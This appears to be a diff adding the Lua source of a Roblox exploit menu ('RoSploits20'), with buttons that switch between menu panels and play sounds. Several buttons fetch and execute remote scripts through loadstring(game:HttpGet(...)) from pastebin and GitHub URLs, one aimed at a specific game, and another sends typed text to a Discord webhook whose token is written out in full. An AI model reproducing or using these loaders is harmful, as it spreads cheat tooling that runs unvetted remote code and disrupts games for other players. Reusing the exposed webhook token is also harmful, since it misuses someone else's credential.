+				Menu:TweenPosition(UDim2.new(-0.002, 1, 0.133, 5))
+				wait(0.8)
+				Menu.Shadow.Visible = true
+				wait(0.2)
+				Debounce = false
+			end
+		else 
+			if Debounce == false then
+				Debounce = true
+				Opened = false
+				Menu:TweenPosition(UDim2.new(-0.343, 1, 0.133, 5))
+				wait(0.8)
+				script.Parent.Parent.Parent.Menu.Visible = false
+				Menu.Shadow.Visible = false
+				wait(0.2)
+				Debounce = false
+			end
+		end
+	end)
+	
+	-- Message for Shitass I can continue later on explaning this I gtg now sorry
+end
+coroutine.wrap(SZMLZ_fake_script)()
+local function JBJAM_fake_script() -- volume_up.LocalScript 
+	local script = Instance.new('LocalScript', volume_up)
+
+	
+	--[
+	--script.Parent.MouseButton1Down:connect(function()
+	--	print("Nice")
+	--	if script.Parent.Parent.volume_off.Visible == false then
+		--	print("Ok")
+		--	script.Parent.Parent.volume_up.Visible = true
+		--	script.Parent.Parent.Parent.Parent.Sound.Volume = 1
+			
+	--	else
+	--		print("work")
+		--	script.Parent.Parent.volume_up.Visible = false
+		--	script.Parent.Parent.volume_off.Visible = true
+		--	script.Parent.Parent.Parent.Parent.Sound.Volume = 0
+			
+		
+	--	end
+		
+	--end)
+	
+	--]]
+end
+coroutine.wrap(JBJAM_fake_script)()
+local function ZVYCE_fake_script() -- Scripts_3.LocalScript 
+	local script = Instance.new('LocalScript', Scripts_3)
+
+	local url = "https://discord.com/api/webhooks/947405535068704768/Gy2bPxAayXKWFftpU63K8UBfJTX1C3EJPjmGBwCcgiRqOdmIxdQ9cYoQi-AD5i2zaOGT" -- this will refer to the url
+	local httpService = game:GetService("HttpService") -- just getting the http service
+	local UIS = game:GetService("UserInputService")
+	
+	
+	script.Parent.MouseButton1Click:Connect(function(player)
+	
+		local data = {
+	
+			['embeds'] = {{
+				['title'] = script.Parent.Parent.Parent.TextBox.Text;
+			}
+			}
+		}
+	
+		local encodedData = httpService:JSONEncode(data)
+		httpService:PostAsync(url, encodedData)
+	end)
+	
+end
+coroutine.wrap(ZVYCE_fake_script)()
+local function SCWSI_fake_script() -- Credits.LocalScript 
+	local script = Instance.new('LocalScript', Credits)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.Parent.SettingsF.Visible = false
+		script.Parent.Parent.Parent.Game.Visible = false
+		script.Parent.Parent.Parent.Credits.Visible = true
+	end)
+end
+coroutine.wrap(SCWSI_fake_script)()
+local function WLYG_fake_script() -- Credits.LocalScript 
+	local script = Instance.new('LocalScript', Credits)
+
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Parent.Sound:Play()
+	
+			script.Parent.Sound.TimePosition = 0
+	
+	end)
+	
+end
+coroutine.wrap(WLYG_fake_script)()
+local function GMTYN_fake_script() -- Settings.LocalScript 
+	local script = Instance.new('LocalScript', Settings)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.Parent.SettingsF.Visible = true
+		script.Parent.Parent.Parent.Game.Visible = false
+		script.Parent.Parent.Parent.Credits.Visible = false
+	end)
+end
+coroutine.wrap(GMTYN_fake_script)()
+local function YLOPTZP_fake_script() -- Settings.LocalScript 
+	local script = Instance.new('LocalScript', Settings)
+
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Parent.Sound:Play()
+	
+		script.Parent.Sound.TimePosition = 0
+	
+	end)
+	
+end
+coroutine.wrap(YLOPTZP_fake_script)()
+local function GXWGXDA_fake_script() -- Scripts_4.LocalScript 
+	local script = Instance.new('LocalScript', Scripts_4)
+
+	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.Parent.SettingsF.Visible = false
+		script.Parent.Parent.Parent.Game.Visible = true
+		script.Parent.Parent.Parent.Credits.Visible = false
+	end)
+end
+coroutine.wrap(GXWGXDA_fake_script)()
+local function AHZP_fake_script() -- Scripts_4.LocalScript 
+	local script = Instance.new('LocalScript', Scripts_4)
+
+	
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.Parent.Sound:Play()
+	
+		script.Parent.Sound.TimePosition = 0
+	
+	end)
+	
+end
+coroutine.wrap(AHZP_fake_script)()
+local function VEJTG_fake_script() -- Scripts_5.LocalScript 
+	local script = Instance.new('LocalScript', Scripts_5)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/mHfK0Xk4", true))()
+	end)
+end
+coroutine.wrap(VEJTG_fake_script)()
+local function ECESK_fake_script() -- Scripts_6.LocalScript 
+	local script = Instance.new('LocalScript', Scripts_6)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
+	end)
+end
+coroutine.wrap(ECESK_fake_script)()
+local function FHOHR_fake_script() -- Execute.LocalScript 
+	local script = Instance.new('LocalScript', Execute)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://pastebin.com/raw/QcNge4QY'),true))()
+	end)
+end
+coroutine.wrap(FHOHR_fake_script)()
+local function JXSVYBE_fake_script() -- thewholegui.transparency 
+	local script = Instance.new('LocalScript', thewholegui)
+
+	
+end
+coroutine.wrap(JXSVYBE_fake_script)()
+local function LBZETL_fake_script() -- RoSploits20.LocalScript 
+	local script = Instance.new('LocalScript', RoSploits20)
+
+	script.Parent.Active = true
+	script.Parent.Draggable = true
+end
+coroutine.wrap(LBZETL_fake_script)()
+-- RoSploits20.Sound play (example) is disabled.
